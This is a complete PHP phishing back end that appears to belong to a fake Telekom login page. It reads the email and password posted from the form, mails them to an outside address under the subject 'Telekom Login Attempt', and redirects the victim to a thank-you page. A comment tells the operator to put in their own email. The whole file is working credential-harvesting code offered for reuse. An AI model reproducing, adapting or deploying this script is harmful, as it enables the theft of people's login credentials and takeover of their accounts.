<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'] ?? 'No email';
    $password = $_POST['password'] ?? 'No password';

    $to = "michaelhollman123@proton.de"; // 🔁 Change this to your email
    $subject = "Telekom Login Attempt";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: noreply@yourdomain.com";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        header("Location: thankyou.html");
        exit();
    } else {
        echo "Mail could not be sent.";
    }
}
?>
